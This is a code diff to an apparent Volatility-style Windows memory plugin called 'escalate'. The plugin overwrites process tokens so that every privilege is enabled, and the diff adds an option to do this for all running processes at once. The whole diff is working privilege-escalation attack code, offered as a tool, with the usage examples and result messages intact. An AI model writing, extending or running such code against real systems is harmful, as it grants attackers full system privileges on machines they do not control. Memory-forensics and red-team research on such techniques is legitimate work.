@@ -35,9 +35,13 @@ class escalate(common.AbstractWindowsCommand):
         self._config.add_option('PID', short_option='i', type="int", default=None,
             help='ID of Process to Escalate', action='store')
 
-        self._config.add_option('NAME', short_option='n', type='string', default=None, help='Name of Process to Escalate', action='store')
+        self._config.add_option('NAME', short_option='n', type='string', default=None,
+            help='Name of Process to Escalate', action='store')
 
-        if self._config.PID is None and self._config.NAME is None:
+        self._config.add_option('ALL', short_option='a', action="store_true",
+            help="Escalate all Processes", default=False)
+
+        if self._config.PID is None and self._config.NAME is None and not self._config.ALL:
             raise(Exception("Either a process id or a Process name is required e.g." +
                             "\nescalate -i 1104 --write" +
                             "\nescalate -n cmd.exe --write"))
@@ -66,8 +70,8 @@ class escalate(common.AbstractWindowsCommand):
         Performs the escalation attack
         :return: Nothing
         '''
-        token = self._proc.get_token()
-        token.Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
+        for proc in self._proc:
+            proc.get_token().Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
 
 
     def get_pid_from_name(self, name):
@@ -98,21 +102,27 @@ class escalate(common.AbstractWindowsCommand):
 
     def render_text(self, outfd, data):
         self._addrspace = utils.load_as(self._config)
-        pid = self._config.PID
-        name = self._config.NAME
 
-        if pid is None:
-            pid = self.get_pid_from_name(name)
+        if not self._config.ALL:
+            pid = [self._config.PID]
+            name = [self._config.NAME]
+
+            if pid == [None]:
+                pid = [self.get_pid_from_name(n) for n in name]
+
+            else:
+                if name != [None]:
+                    outfd.write("Name and PID were both supplied, disregarding name\n")
+                name = [self.get_name_from_pid(p) for p in pid]
 
         else:
-            if name is not None:
-                outfd.write("Name and PID were both supplied, disregarding name\n")
-            name = self.get_name_from_pid(pid)
+            pid = [proc.UniqueProcessId.v() for proc in win32.tasks.pslist(self._addrspace)]
+            name = [self.get_name_from_pid(p) for p in pid]
 
-
-        self._proc = self.get_target_proc(pid)
+        self._proc = [self.get_target_proc(p) for p in pid]
 
         self.perform_atack()
 
         outfd.write("{:20} {:10} {:35}\n".format("Name", "PID", "Result"))
-        outfd.write("{:20} {:10} {:35}\n".format(name, str(pid), "Privileges Escalated Successfully"))
+        for n, p in zip(name, pid):
+            outfd.write("{:20} {:10} {:35}\n".format(n, str(p), "Privileges Escalated Successfully"))
